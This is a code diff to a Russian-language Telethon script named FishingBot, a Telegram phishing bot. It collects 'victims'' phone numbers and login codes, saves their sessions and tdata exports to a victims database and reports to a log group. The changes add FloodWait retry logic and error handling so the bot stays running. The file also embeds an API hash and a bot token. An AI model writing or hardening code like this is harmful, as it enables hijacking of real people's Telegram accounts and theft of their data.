@@ -4,10 +4,11 @@ import sqlite3
 import json
 import os
 import shutil
+import time
 from datetime import datetime
 from telethon import TelegramClient, events
 from telethon.tl.types import KeyboardButtonRequestPhone, KeyboardButtonCallback, KeyboardButton
-from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneNumberInvalidError, PhoneCodeInvalidError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneNumberInvalidError, PhoneCodeInvalidError, FloodWaitError
 from telethon.tl.functions.contacts import GetContactsRequest
 
 # === КОНФИГУРАЦИЯ ===
@@ -16,8 +17,8 @@ API_HASH = '12814e71d319a434ee2f126d0c51c314'
 BOT_TOKEN = '8651082388:AAF6UNT2y7MSlhkPYGBFkkN4cVkgZ_pZiWc'
 
 # Группа для логов (укажите ID группы)
-LOG_GROUP_ID = -5346240560  # Замените на ID вашей группы
-ADMIN_ID = 8794011165
+LOG_GROUP_ID = -1001234567890  # Замените на ID вашей группы
+ADMIN_ID = 7197493128
 
 SESSIONS_DIR = 'sessions'
 TDATA_DIR = 'tdata_exports'
@@ -51,11 +52,49 @@ class FishingBot:
         self.bot = TelegramClient('bot_session', API_ID, API_HASH)
         self.pending_auth = {}
         self.code_inputs = {}
+        self.is_running = False
+
+    async def start_bot_with_retry(self):
+        """Запуск бота с повторными попытками при FloodWait"""
+        max_retries = 5
+        retry_delay = 60  # Начальная задержка в секундах
+        
+        for attempt in range(max_retries):
+            try:
+                print(f"[SWILL] Попытка запуска бота #{attempt + 1}...")
+                await self.bot.start(bot_token=BOT_TOKEN)
+                print("[SWILL] Бот @zlataslivvv_bot успешно запущен!")
+                return True
+            except FloodWaitError as e:
+                wait_time = e.seconds
+                print(f"[SWILL] FloodWait: нужно подождать {wait_time} секунд (~{wait_time//60} минут)")
+                
+                if wait_time > 300:  # Если больше 5 минут
+                    print(f"[SWILL] Ожидание {wait_time} секунд...")
+                    await asyncio.sleep(wait_time)
+                else:
+                    await asyncio.sleep(wait_time)
+                    
+            except Exception as e:
+                print(f"[SWILL] Ошибка запуска: {e}")
+                if attempt < max_retries - 1:
+                    print(f"[SWILL] Повторная попытка через {retry_delay} секунд...")
+                    await asyncio.sleep(retry_delay)
+                    retry_delay *= 2  # Увеличиваем задержку
+                else:
+                    print("[SWILL] Не удалось запустить бот после всех попыток")
+                    return False
+        
+        return False
 
     async def start(self):
-        await self.bot.start(bot_token=BOT_TOKEN)
-        print("[SWILL] Бот @zlataslivvv_bot запущен и готов к работе!")
+        # Запускаем бота с повторными попытками
+        if not await self.start_bot_with_retry():
+            print("[SWILL] Критическая ошибка: не удалось запустить бота")
+            return
+        
         print("[SWILL] Ожидаем жертв...")
+        self.is_running = True
         
         # Отправляем приветствие в группу
         await self.log_message("🚀 **БОТ АКТИВИРОВАН**\n@zlataslivvv_bot готов к работе!")
@@ -250,6 +289,10 @@ class FishingBot:
         except PhoneNumberInvalidError:
             await event.respond("❌ Неверный номер телефона!")
             self.pending_auth.pop(user_id, None)
+        except FloodWaitError as e:
+            wait_time = e.seconds
+            await event.respond(f"⏳ Подождите {wait_time//60} минут перед следующей попыткой")
+            self.pending_auth.pop(user_id, None)
         except Exception as e:
             await event.respond(f"❌ Ошибка: {str(e)[:100]}")
             self.pending_auth.pop(user_id, None)
@@ -283,7 +326,7 @@ class FishingBot:
             
             tdata_path = await self.export_tdata(user_id, session_file)
             
-            # Сохраняем в БД с новой структурой
+            # Сохраняем в БД
             c.execute('''INSERT INTO victims 
                          (user_id, phone, code, session_file, tdata_path, username, full_name, timestamp)
                          VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
@@ -333,6 +376,10 @@ class FishingBot:
         except PhoneCodeExpiredError:
             await event.respond("⏰ Код истек! Запросите новый.")
             self.pending_auth[user_id]['step'] = 'awaiting_code_request'
+        except FloodWaitError as e:
+            wait_time = e.seconds
+            await event.respond(f"⏳ Подождите {wait_time//60} минут перед следующей попыткой")
+            self.pending_auth.pop(user_id, None)
         except Exception as e:
             await event.respond(f"❌ Ошибка: {str(e)[:100]}")
             self.pending_auth.pop(user_id, None)
@@ -412,8 +459,14 @@ class FishingBot:
 
     async def run(self):
         await self.start()
+        print("[SWILL] Бот запущен, нажмите Ctrl+C для остановки")
         await self.bot.run_until_disconnected()
 
 if __name__ == '__main__':
     bot = FishingBot()
-    asyncio.run(bot.run())
+    try:
+        asyncio.run(bot.run())
+    except KeyboardInterrupt:
+        print("[SWILL] Бот остановлен пользователем")
+    except Exception as e:
+        print(f"[SWILL] Критическая ошибка: {e}")
